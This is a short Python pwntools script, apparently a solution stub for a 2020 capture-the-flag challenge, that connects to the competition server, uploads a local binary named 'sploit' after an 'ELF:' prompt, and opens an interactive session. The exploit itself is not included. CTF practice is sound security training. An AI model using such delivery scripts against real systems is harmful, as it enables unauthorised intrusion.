from pwn import *

r = remote('echo.2020.ctfcompetition.com', 1337)
f = open('sploit', 'rb').read()
r.sendafter('ELF:', p32(len(f)) + f)
r.interactive()
